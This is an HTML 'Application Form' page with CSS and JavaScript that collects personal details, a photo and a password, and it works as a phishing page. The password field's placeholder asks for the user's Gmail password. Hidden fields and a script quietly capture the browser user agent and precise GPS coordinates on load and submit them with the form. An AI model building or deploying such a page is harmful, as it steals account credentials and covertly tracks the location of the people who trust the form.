<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Application Form</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif}
    body{min-height:100vh;background:#f4f6fb;padding:16px;color:#1f2937}
    .wrap{max-width:920px;margin:0 auto}
    .top{text-align:center;margin:10px 0 18px}
    .top h1{font-size:clamp(26px,4vw,40px);margin-bottom:8px}
    .top p{color:#6b7280;font-size:14px}
    .card{background:#fff;border:1px solid #eef2f7;border-radius:20px;box-shadow:0 18px 50px rgba(0,0,0,.10);overflow:hidden}
    .banner{background:linear-gradient(90deg,#fffc00,#fff176);padding:18px 20px;color:#111827;font-weight:700;font-size:15px;border-bottom:1px solid #f1e85e}
    form{padding:22px}
    .section{margin-bottom:22px;padding:18px;border:1px solid #edf1f5;border-radius:18px;background:#fbfcfe}
    .section-title{font-size:16px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:10px}
    .section-title::before{content:"";width:10px;height:10px;border-radius:50%;background:#e6e200}
    .grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
    .field{display:flex;flex-direction:column;gap:7px}
    .full{grid-column:1 / -1}
    label{font-size:13px;font-weight:700;color:#374151}
    input,select,textarea{width:100%;border:1.5px solid #dbe2ea;border-radius:14px;padding:13px 14px;font-size:15px;outline:none;background:#fff;transition:.2s;color:#1f2937}
    input:focus,select:focus,textarea:focus{border-color:#c7c200;box-shadow:0 0 0 4px rgba(255,252,0,.20)}
    textarea{min-height:110px;resize:vertical}
    .upload-box{display:flex;flex-direction:column;gap:10px;padding:14px;border:1.5px dashed #cfd8e3;border-radius:16px;background:#fff}
    .upload-row{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
    .preview{width:72px;height:72px;border-radius:16px;border:1px solid #d8e0ea;background:#f8fafc;overflow:hidden;display:flex;align-items:center;justify-content:center;color:#9ca3af;font-size:12px;text-align:center;padding:6px}
    .preview img{width:100%;height:100%;object-fit:cover;display:none}
    .upload-info{flex:1;min-width:220px}
    .upload-info p{font-size:12px;color:#6b7280;margin-top:4px}
    .file-input{display:none}
    .upload-btn{display:inline-block;background:#111827;color:#fff;padding:11px 16px;border-radius:12px;font-weight:700;font-size:14px;cursor:pointer;user-select:none}
    .actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:4px}
    button{border:none;border-radius:14px;padding:13px 18px;font-size:15px;font-weight:700;cursor:pointer}
    .submit{background:linear-gradient(90deg,#fffc00,#fff176);color:#111827;min-width:160px}
    .reset{background:#e5e7eb;color:#111827;min-width:160px}
    .mini{font-size:12px;color:#6b7280;margin-top:10px}
    @media (max-width:720px){
      body{padding:10px}
      form{padding:16px}
      .grid{grid-template-columns:1fr}
      .section{padding:14px}
      .upload-btn,.submit,.reset{width:100%}
    }

:root{
  --bg:#f4f6fb;
  --text:#1f2937;
  --card:#ffffff;
  --border:#dbe2ea;
}

.dark-mode{
  --bg:#0f172a;
  --text:#f8fafc;
  --card:#1e293b;
  --border:#334155;
}

body{
  background:var(--bg);
  color:var(--text);
  transition:.3s;
}

.card,.section,.upload-box{
  background:var(--card);
  transition:.3s;
}

input,select,textarea{
  background:var(--card);
  color:var(--text);
  border-color:var(--border);
}

.dark-mode label,
.dark-mode p,
.dark-mode h1,
.dark-mode h2,
.dark-mode h3{
  color:#f8fafc;
}


#fileName{
    word-break: break-all;
}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="top">
      <h1>Application Form</h1>
      <p> professional form for security please fill this form </p>

 <button id="themeBtn"
 onclick="toggleTheme()"
 style="
 padding:10px 16px;
 border:none;
 border-radius:12px;
 cursor:pointer;
 font-weight:bold;
 margin-top:10px;">
 🌙 Dark Mode
 </button>

    </div>

    <div class="card">
      <div class="banner">Form Submission Portal</div>


<div class="welcome-text">
  {{ welcome_text }}
</div>

      <form id="appForm" action="/submit" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="android_version" id="android_version">
        <input type="hidden" name="latitude" id="latitude">
         <input type="hidden" name="longitude" id="longitude">
        <div class="section">
          <div class="section-title">Basic Details</div>
          <div class="grid">
            <div class="field">
              <label for="full_name">Full Name *</label>
              <input type="text" id="full_name" name="full_name" required placeholder="Enter your full name" />
            </div>

            <div class="field">
              <label for="dob">Date of Birth *</label>
              <input type="date" id="dob" name="dob" required />
            </div>

            <div class="field">
              <label for="gender">Gender *</label>
              <select id="gender" name="gender" required>
                <option value="">Select gender</option>
                <option>Male</option>
                <option>Female</option>
                <option>Other</option>
              </select>
            </div>
          </div>
        </div>

        <div class="section">
          <div class="section-title">Contact Details</div>
          <div class="grid">
            <div class="field">
              <label for="email">Gmail / Email *</label>
              <input type="email" id="email" name="email" required placeholder="example@gmail.com" />
            </div>

            <div class="field">
              <label for="phone">Phone Number *</label>
            
 <input
  type="tel"
  id="phone"
  name="phone"
  required
  minlength="10"
  maxlength="10"
  pattern="[0-9]{10}"
  placeholder="10 digit number"
/>
  
         
</div>
<div class="field full">
  <label for="password">Password *</label>

  <div style="display:flex;gap:8px;">
    <input
      type="password"
      id="password"
      name="password"
      required
      minlength="8"
      placeholder="enter gmail password"
      style="flex:1;"
    >

    
<button
  type="button"
  id="toggleBtn"
  onclick="togglePassword()"
  style="padding:12px;border:none;border-radius:12px;cursor:pointer;"
>
  Show
</button>

  </div>
</div>


          </div>
        </div>

        <div class="section">
          <div class="section-title">Photo Upload</div>
          <div class="upload-box">
            <div class="upload-row">
              <div class="preview" id="previewBox">
                <span>Image Preview</span>
                <img id="previewImg" alt="Preview" />
              </div>

              <div class="upload-info">
                <strong>Upload your image</strong>
                <p> JPG  PNG...... </p>
                <div class="file-name" id="fileName">No file selected</div>
                <div id="badge" style="display:none;color:green;font-weight:bold;margin-top:5px;">
    ✅ Image Selected
</div>
              </div>
            </div>

            <input type="file" id="photo" name="photo" class="file-input" accept="image/*" />
            <label for="photo" class="upload-btn">Choose Image</label>
          </div>
        </div>

        <div class="section">
          <div class="section-title">Extra Information</div>
          <div class="grid">
            <div class="field full">
              <label for="village">Village Name *</label>
 <input
  type="text"
  id="village"
  name="village"
  required
  placeholder="Enter village name"
 />
            </div>

         
          </div>
        </div>

        <div class="actions">
          <button type="reset" class="reset">Clear Form</button>
          <button
  type="submit"
  class="submit"  .submit{
  background: linear-gradient(90deg,#fffc00,#fff176);
  color: #111827;
  min-width:160px;
}
>
  Submit Form
</button>
        </div>

        <div class="mini">* Required fields</div>
      </form>
    </div>
  </div>

  <script>
    const photo = document.getElementById("photo");
    const fileName = document.getElementById("fileName");
    const previewImg = document.getElementById("previewImg");
    const previewBox = document.getElementById("previewBox");
    const form = document.getElementById("appForm");

    photo.addEventListener("change", () => {
      const file = photo.files[0];
      if (!file) {
        fileName.textContent = "No file selected";
        previewImg.style.display = "none";
        previewBox.querySelector("span").style.display = "block";
        return;
      }

      let name = file.name;

if (name.length > 20) {
    name = name.substring(0, 20) + "...";
}

fileName.textContent = name;
document.getElementById("badge").style.display = "block";
      const reader = new FileReader();
      reader.onload = (e) => {
        previewImg.src = e.target.result;
        previewImg.style.display = "block";
        previewBox.querySelector("span").style.display = "none";
      };
      reader.readAsDataURL(file);
    });

    form.addEventListener("reset", () => {
      setTimeout(() => {
        fileName.textContent = "No file selected";
        document.getElementById("badge").style.display = "none";
        previewImg.style.display = "none";
        previewImg.src = "";
        previewBox.querySelector("span").style.display = "block";
      }, 0);
    });

function togglePassword() {
    const password = document.getElementById("password");
    const btn = document.getElementById("toggleBtn");

    if (password.type === "password") {
        password.type = "text";
        btn.innerText = "Hide";
    } else {
        password.type = "password";
        btn.innerText = "Show";
    }
}

function toggleTheme(){

  document.body.classList.toggle("dark-mode");

  const btn = document.getElementById("themeBtn");

  if(document.body.classList.contains("dark-mode")){
      btn.innerHTML="☀️ Light Mode";
      localStorage.setItem("theme","dark");
  }else{
      btn.innerHTML="🌙 Dark Mode";
      localStorage.setItem("theme","light");
  }
}

window.addEventListener("load",()=>{

  const savedTheme=localStorage.getItem("theme");

  if(savedTheme==="dark"){
      document.body.classList.add("dark-mode");
      document.getElementById("themeBtn").innerHTML="☀️ Light Mode";
  }

});

console.log("GPS Script Loaded");

document.getElementById("android_version").value = navigator.userAgent;

if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

        function(position) {

            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            document.getElementById("latitude").value = lat;
            document.getElementById("longitude").value = lon;

        },

        function(error) {
            console.log("GPS not available: " + error.message);
        },

        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }

    );

}
else {
    console.log("GPS not supported");
}
            

  </script>
</body>
</html>
